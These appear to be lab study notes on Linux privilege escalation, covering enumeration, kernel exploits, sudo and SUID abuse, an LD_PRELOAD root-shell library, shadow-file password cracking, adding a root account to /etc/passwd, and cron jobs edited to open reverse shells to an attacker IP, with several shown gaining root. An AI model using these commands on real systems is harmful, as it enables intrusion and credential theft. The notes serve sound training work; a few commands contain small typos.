# Linux Privilege Escalation
## What is Privilege Escalation?
* Going from a lower permission account to a higher permission one.
* Exploitation of a vulnerability, design flaw, or configuration oversight in an OS or application to gain unauthorised access to resources that are usually restricted from the users.

## Why is it important?
* Rare to be able to gain a foothold (initial access) that gives direct administrative access.
* Gaining system administrator levels of access allows additional actions to be perfromed.
 * Resetting passwords.
 * Bypassing access controls to compromise protected data.
 * Editing software configurations.
 * Enabling persistence.
 * Changing the privilege of existing (or new) users.
 * Execute any administrative command.

## Enumeration
* First step to take once access is gained to any system.
  * May have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account.
* Enumeration is as important during the post-compromise phase as it is before.

### `hostname`
* `hostname` command return the hostname of the target machine.
* Can provide information about the target system’s role within the corporate network.
  * SQL-PROD-01 for a production SQL server.

### `uname -a`
* Prints system information giving additional detail about the kernel used by the system.
* Useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

### `/proc/version`
* Proc filesystem (procfs) provides information about the target system processes.
* Essential Linux tool to have in the arsenal.
* `cat /proc/version` may give information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

### `/etc/issue`
* Systems can be identified by reading the `/etc/issue` file using `cat`.
* Usually contains some information about the OS.

### `ps`
* Effective way to see the running processes on a Linux system.
* Shows processes for the current shell.
* Output of the `ps` (Process Status).
  * PID: The process ID (unique to the process).
  * TTY: Terminal type used by the user.
  * Time: Amount of CPU time used by the process (this is NOT the time this process has been running for).
  * CMD: The command or executable running (will NOT display any command line parameter).
* Provides a few useful options.
  * `ps -A`: View all running processes.
  * `ps axjf`: View process tree.

#### `ps aux`
* Shows processes for all users (a).
* Displays the user that launched the process (u).
* Shows processes that are not attached to a terminal (x).
* Output gives a better understanding of the system and potential vulnerabilities.

### `env`
* Show environmental variables.
* `PATH` variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

### `sudo -l`
* The target system may be configured to allow users to run some (or all) commands with root privileges.
* Used to list all commands the current user can run using sudo.

### `ls`
* Always use `ls -la` while looking for potential privilege escalation vectors.

### `Id`
* Provides a general overview of the user’s privilege level and group memberships.
* Can be used to obtain the same information for another user.

### `/etc/passwd`
* Reading the `/etc/passwd` file with 'cat' can be an easy way to discover users on the system.
* Output can be easily cut and converted to a useful list for brute-force attacks.
```
cat /etc/passwd | cut -d ":" -f 1
``` 
* Grep for 'home' as real users will most likely have their folders under this directory.
```
cat /etc/passwd | grep home
```
### `history`
* Looking at earlier commands with the `history` command can give some idea about the target system.
* Rarely has stored information such as passwords or usernames.

### `ifconfig`
* Gives information about the network interfaces of the system.
* Target system may be a pivoting point to another network.
  * Target may have three interfaces (eth0, tun0, and tun1).
  * Attacker can reach the eth0 interface but can not directly access the two other networks.
  * Confirm using `ip route` command to see which network routes exist. 

### `netstat`
* Worth looking into existing communications.
* Used with several different options to gather information on existing connections.
  * `netstat -a`: shows all listening ports and established connections.
  * `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
  * `netstat -l`: list ports in 'listening' mode.
    * These ports are open and ready to accept incoming connections.
    * Use with `t` option to list only ports that are listening using the TCP protocol.
  * `netstat -s`: list network usage statistics by protocol.
    * Use with `-t` or `-u` options to limit the output to a specific protocol.
  * `netstat -tp`: list connections with the service name and PID information.
    * Use with `-l` to list listening ports.
    * `PID/Program name` column will be empty if the process is owned by another user.
  * `netstat -i`: Shows interface statistics.
* `netstat -ano` usage is seen most often.
  * `-a`: Display all sockets
  * `-n`: Do not resolve names
  * `-o`: Display timers

### `find`
* Searching the target system for important information and potential privilege escalation vectors can be fruitful.

| `Find` Parameters | Purpose
| --- | ---
| `find . -name flag1.txt` | Find the file named `flag1.txt` in the current directory.
| `find /home -name flag1.txt` | Find the file names `flag1.txt` in the `/home` directory.
| `find / -type d -name config` | Find the directory named config under `/`.
| `find / -type f -perm 0777` | Find files with the 777 permissions (files readable, writable, and executable by all users).
| `find / -perm a=x` | Find executable files.
| `find /home -user frank` | Find all files for user `frank` under `/home`.
| `find / -mtime 10` | Find files that were modified in the last 10 days.
| `find / -atime 10` | Find files that were accessed in the last 10 day.
| `find / -cmin -60` | Find files changed within the last hour (60 minutes).
| `find / -amin -60` | Find files accessed within the last hour (60 minutes).
| `find / -size 50M` | Find files with a 50 MB size. This command can also be used with `+` and `-` signs to specify a file that is larger or smaller than the given size.

* Use `find -type f 2>/dev/null` to redirect errors to `/dev/null` and have a cleaner output.
* Folders and files that can be written to or executed from.

`find / -writable -type d 2>/dev/null` : Find world-writeable folders.
`find / -perm -222 -type d 2>/dev/null` : Find world-writeable folders.
`find / -perm -o w -type d 2>/dev/null` : Find world-writeable folders.

* `perm` parameter affects how `find` works.
  * `find / -perm -o x -type d 2>/dev/null` finds world-executable folders.
* Find development tools and supported languages.
  * `find / -name perl*`
  * `find / -name python*`
  * `find / -name gcc*`

* SUID bit allows the file to run with the privilege level of the account that owns it rather than the account which runs it.
  * Allows for an interesting privilege escalation path.
```
find / -perm -u=s -type f 2>/dev/null
``` 

## Automated Enumeration Tools
* Tools should only be used to save time knowing they may miss some privilege escalation vectors.
* Target system’s environment will influence the tool to use.
  * E.g. cannot run a tool written in Python if it is not installed on the target system.
* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
* [LinEnum](https://github.com/rebootuser/LinEnum).
* [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester).
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
* [Linux Priv Checker](https://github.com/linted/linuxprivchecker).

## Privilege Escalation: Kernel Exploits
* Privilege escalation ideally leads to root privileges.
  * May be achieved by exploiting an existing vulnerability or by accessing another user account that has more privileges, information, or access.
* Privilege escalation process will rely on misconfigurations and lax permissions unless a single vulnerability leads to a root shell.
* Linux kernel manages communication between components such as the memory on the system and applications.
  * Requires the kernel to have specific privileges.
  * Successful exploit will potentially lead to root privileges.
* Kernel exploit methodology is simple.
1. Identify the kernel version.
2. Search and find an exploit code for the kernel version of the target system.
3. Run the exploit.
* Failed kernel exploits can lead to a system crash.
  * Ensure this potential outcome is acceptable within the scope of the penetration testing engagement before attempting a kernel exploit.

### Research sources
* Use Google to search for existing exploit code based on enumeration findings.
* [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can be useful.
* Use a script like LES (Linux Exploit Suggester).
  * Can generate false positives (report a kernel vulnerability that does not affect the target system).
  * Can generate false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

### Hints/Notes
* Be specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit.
* Understand how the exploit code works BEFORE launching it.
* Some exploit codes can make changes on the OS that would make them insecure in further use or make irreversible changes to the system.
  * This creates problems later.
  * Absolute no-nos during a real penetration testing engagement.
* Some exploits may require further interaction once they are run.
* Read all comments and instructions provided with the exploit code.
* Transfer exploit code from the attacking machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

## Kernel exploit Methodology
1. Identify the kernel version.
```
uname -a
```
2. Find an exploit code for the kernel version of the target system.
  * Use [Exploit Database](https://www.exploit-db.com) to search for an exploit code.
3. Download the exploit to the attacking machine.
4. Serve the exploit code to the target using `SimpleHTTPServer` Python module.
```
python3 -m http.server 9000
```
5. Use `wget` on target machine to copy the code across.
```
wget http://10.10.166.35:9000/37392.c -P /tmp/
```
  * `-P` option specifies that the file should be saved to the `/tmp/` directory on the target.
    * Specify the path as `/tmp/` to avoid the permission error while running `wget` as a low-level privilege user (karen).
6. Run the exploit file to perform privilege escalation.
> Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
  * Rename the exploit file.
```
ofc.c: mv ./37392.c ofc.c
```
  * Compile C source code file into a binary executable file.
```
gcc ofs.c -o ofs
```
  * `gcc` is the GNU Compiler Collection.
    * Commonly used compiler for the C programming language on Linux.
  * `ofs.c` file contains the C source code that will be compiled into the executable file.
  * `-o` option specifies the output file name, which in this case is `ofs`.
 * Type `./ofs` to run the compiled executable file.
7. Verify that root privilege has been gained.
```
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

## Privilege Escalation: Sudo
* System administrators may need to give regular users some flexibility on their privileges.
* Check current root privileges using `sudo -l` command.
* [GTFOBins](https://gtfobins.github.io/) provides information on how a user with sudo rights on a program can abuse it.
  * E.g. user has sudo rights on `nmap` command.
    * Interactive mode available on versions 2.02 to 5.21 can be used to spawn a root shell.
    * `sudo nmap --interactive`.
  * E.g. user has sudo rights on `find` command.
    * `find . -exec /bin/sh \; -quit` may be able to break out from restricted environments by spawning an interactive system shell.

## Leverage application functions
* Some applications will not have a known exploit.
* E.g. Apache2 server.
  * Can use a 'hack' to leak information leveraging a function of the application.
  * Apache2 has an option that supports loading alternative configuration files.
  * `-f : specify an alternate ServerConfigFile`.
  * Loading the `/etc/shadow` file using `-f` option will result in an error message that includes the first line of the `/etc/shadow` file.

## Leverage LD_PRELOAD
* LD_PRELOAD environment option is a function that allows any program to use shared libraries.
* This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) describes the capabilities of LD_PRELOAD.
* A shared library can be generated that will be loaded and executed before the program is run if the `env_keep` option is enabled.
* LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
* Privilege escalation vector.
1. Check for LD_PRELOAD (with the env_keep option).
2. Write a simple C code compiled as a share object (.so extension) file.
   * C code will simply spawn a root shell.
   * Save code as `shell.c`.

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
  
3. Compile it using gcc (GNU Compiler Collection) into a shared object file.

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
4. Run the program with sudo rights and the LD_PRELOAD option pointing to the .so file.
   * `Apache2`, `find`, or almost any of the programs that can be run with sudo can be used.
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
5. This will result in a shell spawn with root privileges.

## Privilege Escalation: SUID
* Linux files can have read, write, and execute permissions.
  * Given to users within their privilege levels.
  * SUID (Set-user Identification) allow files to be executed with permission level of the file owner.
  * SGID (Set-group Identification) allow files to be executed with permission level of the group owner.
    * `s` bit set showing file's special permission level.
* `find / -type f -perm -04000 -ls 2>/dev/null` lists files that have SUID or SGID bits set.
  * Compare executables on this list with [GTFOBins](https://gtfobins.github.io).
  * Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set.
  * Use [this link](https://gtfobins.github.io/#+suid) for pre-filtered list.
    * List shows that `base64` has the SUID bit set.
```
1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
```
>SUID

>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

>This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
```
LFILE=file_to_read
./base64 "$LFILE" | base64 --decode
```
* `base64` SUID bit set does not drop the elevated privileges and may be abused to access the file system.
  * `base64` is owned by root.
  * Reading and editing of files at a higher privilege level than the current user is possible.
* Two basic options for privilege escalation.
  * Reading the `/etc/shadow` file.
  * Adding the user to `/etc/passwd`.

## Read /etc/shadow file
* `find / -type f -perm -04000 -ls 2>/dev/null`.
  * `/usr/bin/base64` has SUID bit set.
```
$ LFILE=/etc/shadow
$ /usr/bin/base64 "$LFILE" | base64 --decode | grep user2
```
* Prints contents of the `/etc/shadow` file.
```
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
```
```
$ LFILE=/etc/passwd
$ /usr/bin/base64 "$LFILE" | base64 --decode | grep user2
```
* Prints contents of the `/etc/passwd` file.
```
user2:x:1002:1002::/home/user2:/bin/sh
```
* Create temporary 'SUID' folder on Desktop.
```
mkdir ./Desktop/SUID
```
* Create empty files in SUID folder.
```
touch ./Desktop/SUID/passwd.txt
```
  * Copy **user2** data from `/etc/passwd' into `passwd.txt` file.
```
touch ./Desktop/SUID/passwords.txt
```
```
touch ./Desktop/SUID/shadow.txt
```
  * Copy **user2** data from `/etc/shadow' into `shadow.txt` file.
* `unshadow` tool creates a file crackable by John the Ripper.
```
unshadow ./Desktop/SUID/passwd.txt ./Desktop/SUID/shadow.txt > ./Desktop/SUID/passwords.txt
```
* John the Ripper can return one or several passwords in cleartext with the correct wordlist and a little luck.
```
john --wordlist=/usr/share/wordlists/rockyou.txt ./Desktop/SUID/passwords.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (user2)
1g 0:00:00:06 DONE (2024-02-12 18:39) 0.1526g/s 547.1p/s 547.1c/s 547.1C/s asdf1234..fresa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
* Another option would be to add a new user that has root privileges if the SUID bit was set for a text editor.
  * This would help circumvent the tedious process of password cracking.
  * Need the hash value of the password the new user should have.
    * This can be done quickly using `openssl`.
```
openssl passwd -1 -salt THM password1
$1$THM$WnbwlliCqxFRQepUTCkUT1
```
* Add the password with a username to the `/etc/passwd` file.
```
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
``` 
* Switch to the new user and hopefully gain root privileges. 

## Privilege Escalation: Capabilities
* "Capabilities" are another method system admins can use to increase the privilege level of a process or binary.
  * Manage privileged at a more granular level.
  * Change the capabilities of an individual binary.
* `getcap` tool lists enabled capabilities.
   * Generates huge amount of errors when run as unprivileged user.
     * Redirect error messages to `dev/null`.
```
getcap -r / 2>/dev/null
```
* Output lists
```
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```
* [GTFObins](https://gtfobins.github.io/#+capabilities) has good list of binaries if any capabilities are set.
> ## Capabilities
> If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
> This requires that vim is compiled with Python support. Prepend :py3 for Python 3.
> cp $(which vim) .
> sudo setcap cap_setuid+ep vim
> ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
* `vim` does not have the SUID bit set.
  * Capability attack vector is not discoverable when looking for SUID.
```
ls -l /usr/bin/vim
lrwxrwxrwx 1 root root 21 Oct 26  2020 /usr/bin/vim -> /etc/alternatives/vim

ls -l /home/karen/vim
-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim
```
* Leverage GTFObins command.
```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
* Root shell is launched.
```
# id
uid=0(root) gid=1001(karen) groups=1001(karen)
```
## Privilege Escalation: Cron Jobs
* Cron jobs are used to run scripts or binaries at specific times.
* Run with privilege of their owner by default.
* If a scheduled task that runs with root privileges can be changed (ideally to a shell) then this is a privilege escalation vector.
* Configurations stored as crontabs (cron tables).
  * Determines next time and date task will run.
* Every user has own crontab file.
* Any user can read system-wide cron jobs file.
```
cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```
* All scripts configured to run every minute.
* Contents of `/home/karen/backup.sh`.
```
cat /home/karen/backup.sh
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*
```
* Modify accessible script to create a reverse shell.
* `nc` will most likely not support `-e` option due to security.
* Always prefer to start reverse shells.
  * Do not want to compromise system integrity.
* Create Reverse shell script.
1. `nano /home/karen/backup/sh`
2. Delete bottom two lines.
4. Add `bash -i >& /dev/tcp/10.10.16.10/6666 0>&1`
   * IP address is that of the attacker.
7. CTRL+X to save and exit.
* Ensure that script is executable.
```
chmod +x /home/karen/backup.sh
```
* Run listener on attacking machine to receive incoming connection.
```
nc -nlvp 6666
Listening on [0.0.0.0] (family 0, port 6666)

Connection from 10.10.43.228 40628 received!
bash: cannot set terminal process group (12806): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-43-228:~#
root@ip-10-10-43-228:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-43-228:~# whoami
whoami
root
root@ip-10-10-43-228:~# 
```
* Crontab can sometimes lead to easy priviledge escalation vectors.
1. System admin needs to run script at regular intervals.
2. Creates a cron job to do this.
3. Script becomes obsolete and is deleted.
4. Cron job is not cleaned up.
   * Change management failure results in potential exploit.
   * `test.py` has been deleted but cron job still exists.
```
find /tmp -name test.py
```
* Cron refers to paths listed under `PATH` variable in `/etc/crontab` file if full script is not defined.
* Create script named `test.py` in `/tmp` folder to be run by the cron job.
1. `nano tmp/test.py`
2. Enter reverse shell code.
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.10/6666 8>&1
```
4. CTRL+X to save and exit.
5. Make script executable.
```
chmod +x ./antivirus.sh
```
6. Create listener on attacking machine to catch connection.
```
nc -lvnp 6666
```
## Privilege Escalation: PATH
## Privilege Escalation: NFS
## Capstone Challenge
